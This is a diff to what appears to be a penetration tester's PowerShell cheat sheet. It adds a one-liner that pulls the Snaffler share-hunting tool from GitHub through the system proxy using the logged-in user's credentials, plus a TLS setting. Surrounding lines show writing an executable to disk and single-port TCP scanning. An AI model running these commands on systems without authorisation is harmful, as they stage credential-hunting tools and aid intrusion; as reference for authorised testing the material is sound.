@@ -62,6 +62,16 @@
   [System.IO.File]::WriteAllBytes("C:\temp\newfile.exe", $ByteArray)
   ```
   
+- Download through proxyserver:   
+```
+powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; (New-Object Net.WebClient).DownloadFile('https://github.com/SnaffCon/Snaffler/releases/download/0.9.11/Snaffler.exe', 'snaffler.exe')"
+```
+Specify TLS:   
+```
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+```
+
+  
 ### Recon
 - Portscanning on single port without ping test:   
   `New-Object System.Net.Sockets.TCPClient -ArgumentList "hostname.domain.local",3389`   
